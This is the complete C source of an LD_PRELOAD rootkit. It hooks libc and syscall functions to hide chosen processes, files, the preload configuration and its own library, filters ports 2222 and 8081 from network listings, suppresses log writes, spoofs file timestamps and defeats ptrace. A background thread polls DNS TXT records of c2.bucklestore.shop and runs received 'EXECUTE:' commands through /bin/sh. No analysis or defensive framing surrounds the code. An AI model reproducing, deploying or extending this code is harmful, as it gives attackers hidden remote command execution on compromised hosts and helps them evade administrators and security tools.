#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/syscall.h>
#include <stdarg.h>
#include <limits.h>
#include <fcntl.h>
#include <sys/ptrace.h> // Required for ptrace hook
#include <time.h>       // Required for C2 timing
#include <pthread.h>    // Required for C2 thread
#include <resolv.h>     // Required for native DNS lookups
#include <arpa/inet.h>  // Required for DNS constants
#include <sys/wait.h>   // Required for waitpid

// --- CONFIGURATION ---
static const char* CMDLINE_TO_FILTER = "ngrok";
static const char* SECOND_CMDLINE_TO_FILTER = "google";
static const char* THIRD_CMDLINE_TO_FILTER = "git.py";
static const char* PRELOAD_FILE_PATH = "/etc/ld.so.preload";
static const char* PATH_TO_FILTER = "/home/user";
static const char* EXECUTABLE_TO_FILTER = "ngrok";
static const char* LOG_SPOOF_TRIGGER = "MALICIOUS_ACTIVITY";
static const char* TEMPLATE_FILE_PATH = "/";
static const char* ROOTKIT_LIB_PATH = "/usr/local/lib/libgit.so";
static const char* C2_DOMAIN = "c2.bucklestore.shop";

// C2 Configuration
#define MAX_DYNAMIC_HIDDEN 10
static char* dynamic_hidden_procs[MAX_DYNAMIC_HIDDEN];
static int num_dynamic_hidden = 0;
#define C2_CHECK_INTERVAL 60 // seconds

static const int PORTS_TO_HIDE[] = {2222, 8081};
static const int NUM_PORTS_TO_HIDE = sizeof(PORTS_TO_HIDE) / sizeof(PORTS_TO_HIDE[0]);

// Original function pointers
static long (*original_syscall)(long, ...) = NULL;
static ssize_t (*original_write)(int, const void*, size_t) = NULL;
static ssize_t (*original_read)(int, void*, size_t) = NULL;
static ssize_t (*original_readlink)(const char*, char*, size_t) = NULL;
static FILE* (*original_fopen)(const char*, const char*) = NULL;
static int (*original_open)(const char*, int, ...) = NULL;
static int (*original_access)(const char*, int) = NULL;
static long (*original_ptrace)(enum __ptrace_request request, ...);
static struct dirent *(*original_readdir)(DIR *dirp);

// Pointers for stat functions (timestamp spoofing)
static int (*original_xstat)(int, const char*, struct stat*) = NULL;
static int (*original_lxstat)(int, const char*, struct stat*) = NULL;
static int (*original_fxstat)(int, int, struct stat*) = NULL;

void check_for_c2_command(void); // Forward declaration

// C2 logic moved to a dedicated thread for stability.
void* c2_thread_function(void* arg) {
    // Wait for 10 seconds before the first check to prevent race conditions on startup.
    sleep(10);
    while (1) {
        check_for_c2_command();
        sleep(C2_CHECK_INTERVAL);
    }
    return NULL;
}

// Use pthread_once to safely start the C2 thread only once.
static pthread_once_t c2_thread_once = PTHREAD_ONCE_INIT;

void start_c2_thread_once() {
    pthread_t c2_thread;
    if (pthread_create(&c2_thread, NULL, c2_thread_function, NULL) != 0) {
        fprintf(stderr, "Rootkit C2 Error: Failed to create C2 thread.\n");
    } else {
        pthread_detach(c2_thread);
    }
}

__attribute__((constructor))
static void initialize_hooks() {
    original_syscall = dlsym(RTLD_NEXT, "syscall");
    if (!original_syscall) { fprintf(stderr, "Rootkit Error: could not find original syscall\n"); }
    original_write = dlsym(RTLD_NEXT, "write");
    if (!original_write) { fprintf(stderr, "Rootkit Error: could not find original write\n"); }
    original_read = dlsym(RTLD_NEXT, "read");
    if (!original_read) { fprintf(stderr, "Rootkit Error: could not find original read\n"); }
    original_readlink = dlsym(RTLD_NEXT, "readlink");
    if (!original_readlink) { fprintf(stderr, "Rootkit Error: could not find original readlink\n"); }
    original_fopen = dlsym(RTLD_NEXT, "fopen");
    if (!original_fopen) { fprintf(stderr, "Rootkit Error: could not find original fopen\n"); }
    original_open = dlsym(RTLD_NEXT, "open");
    if (!original_open) { fprintf(stderr, "Rootkit Error: could not find original open\n"); }
    original_access = dlsym(RTLD_NEXT, "access");
    if (!original_access) { fprintf(stderr, "Rootkit Error: could not find original access\n"); }
    original_ptrace = dlsym(RTLD_NEXT, "ptrace");
    if (!original_ptrace) { fprintf(stderr, "Rootkit Error: could not find original ptrace\n"); }
    original_readdir = dlsym(RTLD_NEXT, "readdir");
    if (!original_readdir) { fprintf(stderr, "Rootkit Error: could not find original readdir\n"); }
    original_xstat = dlsym(RTLD_NEXT, "__xstat");
    if (!original_xstat) { fprintf(stderr, "Rootkit Error: could not find original __xstat\n"); }
    original_lxstat = dlsym(RTLD_NEXT, "__lxstat");
    if (!original_lxstat) { fprintf(stderr, "Rootkit Error: could not find original __lxstat\n"); }
    original_fxstat = dlsym(RTLD_NEXT, "__fxstat");
    if (!original_fxstat) { fprintf(stderr, "Rootkit Error: could not find original __fxstat\n"); }
}

__attribute__((destructor))
static void cleanup() {
    for (int i = 0; i < num_dynamic_hidden; i++) {
        free(dynamic_hidden_procs[i]);
    }
}

static int resolve_path(const char* input_path, char* resolved_path) {
    if (input_path[0] == '/') {
        strncpy(resolved_path, input_path, PATH_MAX - 1);
        resolved_path[PATH_MAX - 1] = '\0';
        return 1;
    }
    if (getcwd(resolved_path, PATH_MAX) == NULL) {
        return 0;
    }
    strncat(resolved_path, "/", PATH_MAX - strlen(resolved_path) - 1);
    strncat(resolved_path, input_path, PATH_MAX - strlen(resolved_path) - 1);
    return 1;
}

static int should_hide_path(const char* path) {
    if (strcmp(path, PRELOAD_FILE_PATH) == 0 ||
        strcmp(path, PATH_TO_FILTER) == 0 ||
        strcmp(path, EXECUTABLE_TO_FILTER) == 0 ||
        strcmp(path, ROOTKIT_LIB_PATH) == 0) {
        return 1;
    }
    return 0;
}

// --- TIMESTAMP SPOOFING HOOKS ---
int __xstat(int ver, const char *path, struct stat *stat_buf) {
    pthread_once(&c2_thread_once, start_c2_thread_once);
    if (!original_xstat) initialize_hooks();
    
    char full_path[PATH_MAX];
    if (resolve_path(path, full_path) && should_hide_path(full_path)) {
        return original_xstat(ver, TEMPLATE_FILE_PATH, stat_buf);
    }
    return original_xstat(ver, path, stat_buf);
}

int __lxstat(int ver, const char *path, struct stat *stat_buf) {
    pthread_once(&c2_thread_once, start_c2_thread_once);
    if (!original_lxstat) initialize_hooks();

    char full_path[PATH_MAX];
    if (resolve_path(path, full_path) && should_hide_path(full_path)) {
        return original_lxstat(ver, TEMPLATE_FILE_PATH, stat_buf);
    }
    return original_lxstat(ver, path, stat_buf);
}

// --- STABLE PROCESS INFO FUNCTIONS ---
static int get_process_cmdline(const char* pid, char* buf, size_t buf_size) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid);
    if (!original_open || !original_read) return 0;
    
    int fd = original_open(path, O_RDONLY);
    if (fd == -1) return 0;

    ssize_t len = original_read(fd, buf, buf_size - 1);
    close(fd);

    if (len <= 0) return 0;

    for (ssize_t i = 0; i < len; ++i) { if (buf[i] == '\0') buf[i] = ' '; }
    buf[len] = '\0';
    return 1;
}

static int get_process_comm(const char* pid, char* buf, size_t buf_size) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%s/stat", pid);
    if (!original_open || !original_read) return 0;

    int fd = original_open(path, O_RDONLY);
    if (fd == -1) return 0;

    char stat_buf[1024];
    ssize_t len = original_read(fd, stat_buf, sizeof(stat_buf) - 1);
    close(fd);

    if (len <= 0) return 0;
    stat_buf[len] = '\0';

    const char* p_start = strchr(stat_buf, '(');
    if (!p_start) return 0;
    p_start++;

    const char* p_end = strrchr(stat_buf, ')');
    if (!p_end) return 0;

    size_t comm_len = p_end - p_start;
    if (comm_len < buf_size) {
        strncpy(buf, p_start, comm_len);
        buf[comm_len] = '\0';
        return 1;
    }
    return 0;
}


// --- CORE HOOKS ---
long syscall(long number, ...) {
    pthread_once(&c2_thread_once, start_c2_thread_once);
    if (!original_syscall) { errno = EFAULT; return -1; }

    if (number == SYS_getdents || number == SYS_getdents64) {
        va_list args;
        va_start(args, number);
        int fd = va_arg(args, int);
        struct dirent* dirp = va_arg(args, struct dirent*);
        unsigned int count = va_arg(args, unsigned int);
        va_end(args);

        long ret = original_syscall(number, fd, dirp, count);
        if (ret <= 0) return ret;

        char fd_path[256];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
        char dir_path[PATH_MAX];
        ssize_t path_len = original_readlink(fd_path, dir_path, sizeof(dir_path) - 1);

        if (path_len <= 0) return ret;
        dir_path[path_len] = '\0';

        long processed_bytes = 0;
        struct dirent* current_entry = dirp;
        while (processed_bytes < ret) {
            if (current_entry->d_reclen == 0) break;

            int should_hide = 0;
            if (strspn(current_entry->d_name, "0123456789") == strlen(current_entry->d_name)) {
                char cmdline[512] = {0};
                char comm[512] = {0};
                int cmdline_ok = get_process_cmdline(current_entry->d_name, cmdline, sizeof(cmdline));
                int comm_ok = get_process_comm(current_entry->d_name, comm, sizeof(comm));

                if (cmdline_ok && (strstr(cmdline, CMDLINE_TO_FILTER) || strstr(cmdline, SECOND_CMDLINE_TO_FILTER) || strstr(cmdline, THIRD_CMDLINE_TO_FILTER))) {
                    should_hide = 1;
                }
                if (!should_hide && comm_ok && (strstr(comm, CMDLINE_TO_FILTER) || strstr(comm, SECOND_CMDLINE_TO_FILTER) || strstr(comm, THIRD_CMDLINE_TO_FILTER))) {
                    should_hide = 1;
                }
            } else {
                char full_path[PATH_MAX];
                strncpy(full_path, dir_path, PATH_MAX - 1);
                full_path[PATH_MAX - 1] = '\0';

                if (full_path[strlen(full_path) - 1] != '/') {
                    strncat(full_path, "/", PATH_MAX - strlen(full_path) - 1);
                }
                strncat(full_path, current_entry->d_name, PATH_MAX - strlen(full_path) - 1);
                
                if (should_hide_path(full_path)) {
                    should_hide = 1;
                }
            }

            if (should_hide) {
                int entry_len = current_entry->d_reclen;
                long remaining_bytes = ret - (processed_bytes + entry_len);
                memmove(current_entry, (char*)current_entry + entry_len, remaining_bytes);
                ret -= entry_len;
                continue;
            }

            processed_bytes += current_entry->d_reclen;
            current_entry = (struct dirent*)((char*)dirp + processed_bytes);
        }
        return ret;
    }

    va_list args;
    va_start(args, number);
    long a1 = va_arg(args, long), a2 = va_arg(args, long), a3 = va_arg(args, long);
    long a4 = va_arg(args, long), a5 = va_arg(args, long), a6 = va_arg(args, long);
    va_end(args);
    return original_syscall(number, a1, a2, a3, a4, a5, a6);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!original_read) { errno = EFAULT; return -1; }
    ssize_t ret = original_read(fd, buf, count);
    if (ret <= 0) return ret;

    char fd_path[256], proc_path[256];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    ssize_t path_len = original_readlink(fd_path, proc_path, sizeof(proc_path) - 1);

    if (path_len > 0) {
        proc_path[path_len] = '\0';
        if (strcmp(proc_path, "/proc/net/tcp") == 0 || strcmp(proc_path, "/proc/net/tcp6") == 0) {
            char* temp_buf = (char*)malloc(ret);
            if (!temp_buf) return ret;

            char* line_start = (char*)buf;
            char* write_ptr = temp_buf;
            ssize_t filtered_len = 0;

            for (ssize_t i = 0; i < ret; ++i) {
                if (((char*)buf)[i] == '\n' || i == ret - 1) {
                    ssize_t line_len = &((char*)buf)[i] - line_start + 1;
                    int should_hide = 0;
                    for (int j = 0; j < NUM_PORTS_TO_HIDE; ++j) {
                        char hex_port[16];
                        snprintf(hex_port, sizeof(hex_port), ":%04X", PORTS_TO_HIDE[j]);
                        if (memmem(line_start, line_len, hex_port, strlen(hex_port)) != NULL) {
                            should_hide = 1;
                            break;
                        }
                    }
                    if (!should_hide) {
                        memcpy(write_ptr, line_start, line_len);
                        write_ptr += line_len;
                        filtered_len += line_len;
                    }
                    line_start = &((char*)buf)[i] + 1;
                }
            }
            memcpy(buf, temp_buf, filtered_len);
            free(temp_buf);
            return filtered_len;
        }
    }
    return ret;
}

ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
    if (!original_readlink) { errno = EFAULT; return -1; }
    ssize_t ret = original_readlink(pathname, buf, bufsiz);
    if (ret > 0 && (size_t)ret < bufsiz) {
        buf[ret] = '\0'; 
        if (should_hide_path(buf)) {
            errno = ENOENT;
            return -1;
        }
    }
    return ret;
}


int open(const char *pathname, int flags, ...) {
    if (!original_open) { errno = EFAULT; return -1; }
    
    char full_path[PATH_MAX];
    if (resolve_path(pathname, full_path) && should_hide_path(full_path)) {
        errno = ENOENT;
        return -1;
    }

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }
    return original_open(pathname, flags, mode);
}

int access(const char *pathname, int mode) {
    if (!original_access) { errno = EFAULT; return -1; }
    
    char full_path[PATH_MAX];
    if (resolve_path(pathname, full_path) && should_hide_path(full_path)) {
        errno = ENOENT;
        return -1;
    }
    return original_access(pathname, mode);
}

ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write) { errno = EFAULT; return -1; }
    if (memmem(buf, count, LOG_SPOOF_TRIGGER, strlen(LOG_SPOOF_TRIGGER)) != NULL) {
        return count;
    }
    return original_write(fd, buf, count);
}

FILE* fopen(const char *path, const char *mode) {
    if (!original_fopen) { errno = ENOENT; return NULL; }

    char full_path[PATH_MAX];
    if (resolve_path(path, full_path) && should_hide_path(full_path)) {
        errno = ENOENT;
        return NULL;
    }
    return original_fopen(path, mode);
}

// --- NEW C2, ANTI-DEBUGGING, AND LSOF-EVASION HOOKS ---

void check_for_c2_command() {
    unsigned char buf[NS_PACKETSZ];
    res_init();
    int len = res_query(C2_DOMAIN, C_IN, T_TXT, buf, sizeof(buf));

    if (len < 0) {
        fprintf(stderr, "Rootkit C2 Error: DNS query failed.\n");
        return;
    }

    ns_msg msg;
    ns_initparse(buf, len, &msg);

    ns_rr rr;
    if (ns_parserr(&msg, ns_s_an, 0, &rr) == 0) {
        const u_char *rdata = ns_rr_rdata(rr);
        char response[256];
        snprintf(response, sizeof(response), "%.*s", rdata[0], rdata + 1);

        if (strncmp(response, "ADD_HIDE:", 9) == 0) {
            if (num_dynamic_hidden < MAX_DYNAMIC_HIDDEN) {
                dynamic_hidden_procs[num_dynamic_hidden] = strdup(response + 9);
                num_dynamic_hidden++;
            }
        } else if (strncmp(response, "EXECUTE:", 8) == 0) {
            pid_t pid = fork();
            if (pid == 0) { // Child process
                execl("/bin/sh", "sh", "-c", response + 8, (char*) NULL);
                _exit(127); // execl only returns on error
            } else if (pid > 0) { // Parent process
                waitpid(pid, NULL, 0);
            }
        }
    }
}

long ptrace(enum __ptrace_request request, ...) {
    if (!original_ptrace) initialize_hooks();

    va_list args;
    va_start(args, request);
    pid_t pid = va_arg(args, pid_t);
    void* addr = va_arg(args, void*);
    void* data = va_arg(args, void*);
    va_end(args);

    char pid_str[32];
    snprintf(pid_str, sizeof(pid_str), "%d", pid);

    char cmdline[512] = {0};
    char comm[512] = {0};
    int cmdline_ok = get_process_cmdline(pid_str, cmdline, sizeof(cmdline));
    int comm_ok = get_process_comm(pid_str, comm, sizeof(comm));

    if ((cmdline_ok && (strstr(cmdline, CMDLINE_TO_FILTER) || strstr(cmdline, SECOND_CMDLINE_TO_FILTER) || strstr(cmdline, THIRD_CMDLINE_TO_FILTER))) ||
        (comm_ok && (strstr(comm, CMDLINE_TO_FILTER) || strstr(comm, SECOND_CMDLINE_TO_FILTER) || strstr(comm, THIRD_CMDLINE_TO_FILTER)))) {
        errno = ESRCH; // No such process
        return -1;
    }

    return original_ptrace(request, pid, addr, data);
}

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) initialize_hooks();

    struct dirent *entry;
    while ((entry = original_readdir(dirp))) {
        char proc_path[PATH_MAX];
        char link_target[PATH_MAX];
        
        int dir_fd = dirfd(dirp);
        snprintf(proc_path, sizeof(proc_path), "/proc/self/fd/%d", dir_fd);
        ssize_t path_len = original_readlink(proc_path, link_target, sizeof(link_target) - 1);
        
        if (path_len > 0) {
            link_target[path_len] = '\0';
            if (strstr(link_target, "/map_files") != NULL) {
                size_t target_len_str = strlen(link_target);
                size_t name_len = strlen(entry->d_name);
                if ((target_len_str + 1 + name_len + 1) < PATH_MAX) {
                    char entry_path[PATH_MAX];
                    strcpy(entry_path, link_target);
                    strcat(entry_path, "/");
                    strcat(entry_path, entry->d_name);
                    
                    char final_target[PATH_MAX];
                    ssize_t target_len = original_readlink(entry_path, final_target, sizeof(final_target) - 1);
                    
                    if (target_len > 0) {
                        final_target[target_len] = '\0';
                        if (strcmp(final_target, ROOTKIT_LIB_PATH) == 0) {
                            continue; // Skip this entry
                        }
                    }
                }
            }
        }
        break; 
    }
    return entry;
}
